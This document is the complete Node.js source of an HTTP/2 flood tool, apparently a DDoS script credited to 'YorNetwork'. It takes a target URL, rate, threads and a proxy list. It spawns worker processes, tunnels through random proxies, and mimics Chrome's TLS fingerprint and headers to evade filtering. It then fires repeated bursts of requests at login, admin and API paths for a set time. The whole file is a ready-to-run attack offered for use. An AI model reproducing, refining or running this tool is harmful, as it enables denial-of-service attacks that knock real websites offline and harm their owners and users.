process.on("SIGHUP", () => {
    return 1;
  })
process.on("SIGCHILD", () => {
    return 1;
  });

require("events").EventEmitter.defaultMaxListeners = 0;
process.setMaxListeners(0);
const cluster = require("cluster");
const crypto = require("crypto");
const http2 = require("http2");
const http = require('http');
const net = require("net");
const tls = require("tls");
const url = require("url");
const fs = require("fs");
var path = require("path");
var fileName = __filename;
var file = path.basename(fileName);

if (process.argv.length < 8){
    console.clear()
    console.log("Made By YorNetwork For SuperFlood Method <3");
    console.log(`node ${file} [url] [time] [rq/s] [threads] [proxy] (options: [cookie]) --debug=true/false`); 
    process.exit();
}

const defaultCiphers = crypto.constants.defaultCoreCipherList.split(":");
const ciphers = "GREASE:" + [
defaultCiphers[2],
defaultCiphers[1],
defaultCiphers[0],
defaultCiphers.slice(3) 
].join(":");

const sigalgs = "ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256:ecdsa_secp384r1_sha384:rsa_pss_rsae_sha384:rsa_pkcs1_sha384:rsa_pss_rsae_sha512:rsa_pkcs1_sha512";
const ecdhCurve = "GREASE:x25519:secp256r1:secp384r1";
const secureOptions = crypto.constants.SSL_OP_NO_SSLv2 |
crypto.constants.SSL_OP_NO_SSLv3 |
crypto.constants.SSL_OP_NO_TLSv1 |
crypto.constants.SSL_OP_NO_TLSv1_1 |
crypto.constants.ALPN_ENABLED |
crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION |
crypto.constants.SSL_OP_CIPHER_SERVER_PREFERENCE |
crypto.constants.SSL_OP_LEGACY_SERVER_CONNECT |
crypto.constants.SSL_OP_COOKIE_EXCHANGE |
crypto.constants.SSL_OP_PKCS1_CHECK_1 |
crypto.constants.SSL_OP_PKCS1_CHECK_2 |
crypto.constants.SSL_OP_SINGLE_DH_USE |
crypto.constants.SSL_OP_SINGLE_ECDH_USE |
crypto.constants.SSL_OP_NO_SESSION_RESUMPTION_ON_RENEGOTIATION;

const secureProtocol = ['TLS_client_method', 'TLSv1_1_method', 'TLSv1_2_method_', 'TLSv1_3_method', 'SSL_OP_NO_SSLv3', 'SSL_OP_NO_SSLv2'];
const secureContextOptions = {
    ciphers: ciphers,
    sigalgs: sigalgs,
    honorCipherOrder: true,
    secureOptions: secureOptions,
    secureProtocol: secureProtocol
};

const secureContext = tls.createSecureContext(secureContextOptions);

const headers = {};

function readLines(filePath) {
    return fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/);
}
 
function randomIntn(min, max) {
     return Math.floor(Math.random() * (max - min) + min);
}
 
function randomElement(elements) {
     return elements[randomIntn(0, elements.length)];
} 

function randomCharacters(length) {
    output = ""
    for (let count = 0; count < length; count++) {
        output += randomElement(characters);
    }
    return output;
}

function getArgs() {
    const _0 = {};
    process.argv.slice(2, process.argv.length).forEach((_1) => {
        if (_1.slice(0, 2) === '--') {
            const _3 = _1.split('=');
            const _4 = _3[0].slice(2, _3[0].length);
            const _5 = _3.length > 1 ? _3[1] : true;
            _0[_4] = _5
        } else {
            if (_1[0] === '-') {
                const _2 = _1.slice(1, _1.length).split('');
                _2.forEach((_1) => {
                    _0[_1] = true
                })
            }
        }
    });
    return _0
}
const getargs = getArgs();

const args = {
    target: process.argv[2],
    time: process.argv[3],
    rate: process.argv[4],
    threads: process.argv[5],
    proxy: process.argv[6],
    cookie: process.argv[7] || undefined,
    port: 443, //process.argv[8]
    debug: process.argv[8] || false
}
if(getargs['debug'] == 'true') {
	process.on('uncaughtException', function(error) {console.log(error)});
	process.on('unhandledRejection', function(error) {console.log(error)});
	
} else { 
	process.on('uncaughtException', function(error) {});
	process.on('unhandledRejection', function(error) {});
	
}
try {
    UA = fs.readFileSync('UA.txt', 'utf-8').replace(/\r/g, '').split('\n');
    randomUAs = UA[Math.floor(Math.random() * UA.length)]
} catch(e) {
    console.log(`[?] File: UA.txt Not Found`);
    console.log("[+] Run this: wget https://raw.githubusercontent.com/FDc0d3/GoodUA/main/UA.txt -O UA.txt");
    console.exit();
}

const accept_header = [
    '*/*',
    'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8',
    'application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8,image/png,*/*;q=0.5',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'text/plain, */*; q=0.01',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, application/x-shockwave-flash, application/msword, */*',
    'text/html, application/xhtml+xml, image/jxr, */*',
    'text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/webp, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1',
    'application/javascript, */*;q=0.8',
    'text/html, text/plain; q=0.6, */*; q=0.1',
    'application/graphql, application/json; q=0.8, application/xml; q=0.7',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8'
],
cache_header = [
    'max-age=0',
    'no-cache',
    'no-store', 
    'must-revalidate',
    'proxy-revalidate'
],
language_header = [
    'ru-RU,ru;q=0.9',
    'ru-RU,ru;q=0.8',
    'ru-RU,ru;q=0.7',
    'ru-RU,ru;q=0.6',
    'ru-RU,ru;q=0.5',
    'en-US,en;q=0.9', 
    'en-US,en;q=0.8', 
    'en-US,en;q=0.7', 
    'en-US,en;q=0.6', 
    'en-US,en;q=0.5', 
    '*'
],
dest_header = [
    'audio',
    'audioworklet',
    'document',
    'embed',
    'empty',
    'font',
    'frame',
    'iframe',
    'image',
    'manifest',
    'object',
    'paintworklet',
    'report',
    'script',
    'serviceworker',
    'sharedworker',
    'style',
    'track',
    'video',
    'worker',
    'xslt'
 ],
mode_header = [
    'cors',
    'navigate',
    'no-cors',
    'same-origin',
    'websocket'
 ],
site_header = [
    'cross-site',
    'same-origin',
    'same-site',
    'none'
],
dirs = [
    "/",
    "/?AttackByYorNetwork",
    "/index.php?3x=3x",
    "/index.php",
    "/login.php",
    "/login.html",
    "/panel/login.php",
    "/admin",
    "/dashboard",
    "/wp-content",
    "/upload",
    "/search",
    "/login",
    "/register",
    "/home",
    "/downloads",
    "/account",
    "/about",
    "/portfolio",
    "/api"
],
http_method = ["GET", "PRI", "HEAD", "POST", "PUT"];

var proxies = readLines(args.proxy);
const parsedTarget = url.parse(args.target);

if (cluster.isMaster){
    console.clear();
    const dateObj = new Date();
    for (let i = 1; i <= process.argv[5]; i++) {
        cluster.fork();
        console.log(`[${i}] BUILDING THREAD...`);
    }
    console.log("[+] Started! Made By YorNetwork For SuperFlood Method <3");
    console.log(`[+] Target: [ ${args.target} ]`)
    console.log(`[+] RQ/S: [ ${args.rate} ]`)
    console.log(`[+] Cookie: [ ${args.cookie} ]`)
    console.log(`[+] Debug: [ ${getargs['debug']} ]`)
    console.log(`[+] Timestamp: [ \x1b[37m${dateObj.toDateString()} ${dateObj.toTimeString()} ]`);
    setTimeout(() => {}, process.argv[5] * 1000);
    for (let counter = 1; counter <= args.threads; counter++) {
        cluster.fork();
    }
} else {
    setInterval(runFlooder)
}

class NetSocket {
     constructor(){}
 
HTTP(options, callback) {
     const parsedAddr = options.address.split(":");
     const addrHost = parsedAddr[0];
     const payload = "CONNECT " + options.address + ":443 HTTP/1.1\r\nHost: " + options.address + ":443\r\nConnection: Keep-Alive\r\n\r\n";
     const buffer = new Buffer.from(payload);
     const connection = net.connect({
     host: options.host,
     port: options.port,
     allowHalfOpen: true,
     writable: true,
     readable: true
     });
 
     connection.setTimeout(options.timeout * 10000);
     connection.setKeepAlive(true, 10000);
     connection.setNoDelay(true);
     connection.on("connect", () => {
     connection.write(buffer);
     });

     connection.on("data", chunk => {
     const response = chunk.toString("utf-8");
     const isAlive = response.includes("HTTP/1.1 200");
     if (isAlive === false) {
     connection.destroy();
     return callback(undefined, "403");
     }
     return callback(connection, undefined);
     });
 
     connection.on("timeout", () => {
         connection.destroy();
         return callback(undefined, "403");
     });
 
     connection.on("error", error => {
         connection.destroy();
         return callback(undefined, "403");
     });
 }}

 const Socker = new NetSocket();
 headers[":method"] = http_method[Math.floor(Math.random() * http_method.length)];
 headers[":path"] = dirs[Math.floor(Math.random() * dirs.length)]
 headers[":scheme"] = "https";
 headers["accept"] = accept_header[Math.floor(Math.random() * accept_header.length)];
 headers["accept-encoding"] = "gzip, deflate, br";
 headers["accept-language"] = language_header[Math.floor(Math.random() * language_header.length)];
 headers["cache-control"] = cache_header[Math.floor(Math.random() * cache_header.length)];
 headers["pragma"] = "no-cache";
 headers["cookie"] = process.argv[7];
 headers["sec-ch-ua"] = '"Google Chrome";v="119", "Chromium";v="119", "Not?A_Brand";v="24"';
 headers["sec-ch-ua-mobile"] = "?0";
 headers["sec-ch-ua-platform"] = "Windows";
 headers["sec-fetch-dest"] = dest_header[Math.floor(Math.random() * dest_header.length)];
 headers["sec-fetch-mode"] = mode_header[Math.floor(Math.random() * mode_header.length)];
 headers["sec-fetch-site"] = site_header[Math.floor(Math.random() * site_header.length)];
 headers["sec-fetch-user"] = "?1";
 headers["TE"] = "trailers";
 headers["upgrade-insecure-requests"] = "1";
 headers["user-agent"] = randomUAs; //"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36 Ungoogled-Chromium/98.0.4758.102";
 headers["x-requested-with"] = "XMLHttpRequest";
 
 tls.DEFAULT_ECDH_CURVE;
 tls.DEFAULT_MAX_VERSION = 'TLSv1.3';
 tls.authorized = true;
 tls.sync = true;

 function runFlooder() {
     const proxyAddr = randomElement(proxies);
     const parsedProxy = proxyAddr.split(":");
     headers[":authority"] = parsedTarget.host
     headers["x-forwarded-for"] = parsedProxy[0];
     headers["x-forwarded-proto"] = "https";
     const proxyOptions = {
     host: parsedProxy[0],
     port: parsedProxy[1],
     address: parsedTarget.host + ":" + args.port,
     timeout: 15
     };

     Socker.HTTP(proxyOptions, (connection, error) => {
         if (error) return
         connection.setKeepAlive(true, 60000);
         connection.setNoDelay(true);

         const settings = {
            enablePush: false,
            initialWindowSize: 1073741823
        };

         const tlsOptions = {
            port: args.port,
            ALPNProtocols: ['h2', 'h3', 'spdy/3.1', 'http/2+quic/43', 'http/2+quic/44', 'http/2+quic/45'],
            challengesToSolve: Infinity,
            followAllRedirects: true,
            clientTimeout: Infinity,
            clientlareMaxTimeout: Infinity,
            maxRedirects: Infinity,
            rejectUnauthorized: false,
            secure: true,
            ciphers: ciphers,
            sigalgs: sigalgs,
            requestCert: true,
            socket: connection,
            ecdhCurve: ecdhCurve,
            honorCipherOrder: false,
            servername: url.hostname,
            host: parsedTarget.host,
            servername: parsedTarget.host,
            secureOptions: secureOptions,
            secureContext: secureContext,
            secureProtocol: secureProtocol
        };

         const tlsConn = tls.connect(args.port, parsedTarget.host, tlsOptions); 
         
         tlsConn.allowHalfOpen = true;
         tlsConn.setNoDelay(true);
         tlsConn.setKeepAlive(true, 60 * 1000);
         tlsConn.setMaxListeners(0);
 
         const client = http2.connect(parsedTarget.href, {
            protocol: "https:",
            settings: {
            headerTableSize: 65536,
            maxConcurrentStreams: 1000,
            initialWindowSize: 6291456,
            maxHeaderListSize: 262144,
            enablePush: false
          },
            maxSessionMemory: 3333,
            maxDeflateDynamicTableSize: 4294967295,
            createConnection: () => tlsConn,
            socket: connection,
         });
 
         client.settings({
            headerTableSize: 65536,
            maxConcurrentStreams: 1000,
            initialWindowSize: 6291456,
            maxHeaderListSize: 262144,
            enablePush: false
          });

         client.setMaxListeners(0);
         client.settings(settings);

         client.on("connect", () => {
            const IntervalAttack = setInterval(() => {
                for (let i = 0; i < args.rate; i++) {
                    const request = client.request(headers)

                    .on("response", response => {
                        request.close();
                        request.destroy();
                        return
                    });

                    request.end();
                }
            }, 1000); 
         });
 
         client.on("close", () => {
             client.destroy();
             connection.destroy();
             return
         });
 
         client.on("error", error => {
             client.destroy();
             connection.destroy();
             return
         });
     });
 }

 const KillScript = () => process.exit();
 setTimeout(KillScript, args.time * 1000);